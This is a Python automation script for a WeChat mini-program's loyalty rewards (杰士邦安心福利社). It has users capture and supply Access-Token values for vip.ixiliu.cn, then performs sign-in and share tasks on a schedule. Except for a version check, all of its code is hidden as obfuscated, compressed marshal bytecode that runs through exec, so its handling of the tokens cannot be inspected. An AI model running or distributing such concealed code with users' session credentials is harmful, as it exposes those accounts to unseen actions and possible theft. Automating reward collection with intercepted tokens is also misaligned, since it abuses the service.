'''
vx小程序 -- 杰士邦安心福利社
抓包 vip.ixiliu.cn 下的 Access-Token
export jsbaxfls='Access-Token1#Access-Token2'
cron: 9 9 * * *
已完成 签到,分享任务
'''

import sys
vesion = sys.version.split(' ')[0]
if vesion.split('.')[1] == "10":
    print(f'你当前的python版本为 {vesion},即将运行脚本...')
else:
    print(f'你当前的python版本为 {vesion},运行所需脚本环境为 3.10.x, 即将退出运行脚本...')
    exit(1)
    
try:
	import marshal,lzma,gzip,bz2,binascii,zlib;exec(marshal.loads(binascii.a2b_base64(b'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\n')))
except KeyboardInterrupt:
	exit()